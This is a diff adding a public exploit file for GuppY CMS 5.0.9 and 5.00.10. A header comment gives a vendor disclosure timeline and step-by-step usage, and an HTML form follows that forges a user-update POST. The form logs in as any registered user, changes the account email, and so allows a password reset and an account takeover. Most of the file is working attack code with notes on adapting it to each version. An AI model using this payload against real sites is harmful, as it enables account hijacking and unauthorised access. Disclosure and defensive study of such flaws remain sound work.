@@ -1,0 +1,60 @@
+<!-- 
+Exploit Title: GuppY CMS 5.0.9 & 5.00.10 Authentication bypass/Change email. Other versions may be vulnerable but weren't tested.
+Date: 2/17/2015
+Exploit Author: Brandon Murphy
+Vendor Homepage: http://freeguppy.org
+Software Link: Windows-5.00.10 https://www.freeguppy.org/dwnld.php?lng=en&delay=5&pg=255317&li=CeCILL
+Version: 5.0.9 & 5.00.10
+Tested on: Windows 7/Firefox & Xubuntu Linux 3.2.0-23-generic
+Xubuntu - Guppy CMS 5.00.10 VM: http://mediafire.com/download/d85mgobb35mblzb/GUPPY5.0.7z Working on Virtualbox & VMWare Workstation - VM by d1ch4do
+Username:xubuntu Pass:reverse
+
+Timeline:
+12/21/2014 Notified vendor of vulnerability.
+12/21/2014 Vendor replied requesting information.
+12/22/2014 Vendor notified of another vulnerability. Supplied both exploits/info.
+12/23/2014 Vendor replied problem identified. I was told that I would be supplied with corrections when patch is ready.
+12/23/2014 Acknowledged. Told vendor full disclosure will be released 45 days after patch release.
+12/29/2014 Vendor releases 5.00.10. Countdown begins.
+1/1/2015 Vendor notified the vulnerabilities still exist in patched version 5.00.10
+1/2/2015 Vendor supplied with version 2 exploits.
+2/17/2015 Public Disclosure. Was delayed due to holiday.
+
+Exploit Description:
+This exploit will automatically log you in and change the email to any registered user except for the admin that is installed with the web application.
+Click on "Become a member" on the target website to insert the appropriate cookies for this to work.
+Once the exploit takes place proceed to click "Modify" and change the password. To see if the user has some sort of admin privileges go to site.com/admin/ while still logged in. If they do it will say "Vic_username, enter your password:" and login with the password you just changed it to.
+
+Disclaimer:
+I cannot be held accountable for anything you do with this exploit. You take responsibility for your own actions. For educational and testing purposes only.
+-->
+
+<html> 
+ <body bgcolor="#000000">
+ <font face="arial" color="#01DF01" size="5">
+ <center>
+ GuppY CMS 5.0.9 & 5.00.10 Authentication bypass/Change email. Other versions may be vulnerable but weren't tested.<br>
+ Stable with Firefox 34.0.5. Other browsers may be unstable or may not work.<br><br><br>
+ Thanks: Fred, d1ch4do, & to all of the people who don't believe in me.<br>
+ <a href="https://linkedin.com/in/brandonm86">My LinkedIn</a><br>-----------------------------------------------------------------------------------</font>
+  <body>
+    <form action="http://website.com/user.php?lng=en" method="POST"> <!-- Change this action to http://website.com/user.php?lng=en&uuser=new to work with 5.00.10. -->
+      <input type="hidden" name="token" value="131095497e5f9d22882.83937400"/> <!-- Click on become a member. View the source then search for "token" and replace this value. Remove this line to work with 5.00.10 -->
+      <input type="hidden" name="setusercookie" value="1"/>
+      <input type="hidden" name="uuser" value="update"/> <!-- Wet paint. Don't touch! -->
+      <input type="hidden" name="code_pseudo" value=""/>
+      <input type="text" name="upseudo" value="Vic Username"/><br><br> <!-- User to login as. Can be any registered user with(out) special privileges. -->
+      <input type="text" name="uuid" value="Password"/><br><br> <!-- Anything you like as you will change the password to what you want after the exploit succeeds. -->
+      <input type="text" name="uuid2" value="Verify Password"/><br><br>
+      <input type="text" name="uemail" value="Your Email"/><br><br><br> <!-- Email will be changed to the one you provide. -->
+      <input type="hidden" name="uwebsite" value="http://"/>
+      <input type="hidden" name="usign" value=""/>
+      <input type="hidden" name="uimgsign" value="http://"/>
+      <input type="hidden" name="ulang" value="en"/>
+      <input type="hidden" name="udesign" value=""/>
+      <input type="hidden" name="uboxes" value="LR"/>
+      <input type="hidden" name="uextavatar" value="http://"/>
+      <input type="submit" value="Enjoy the ride!"/></center>
+    </form>
+  </body>
+</html>
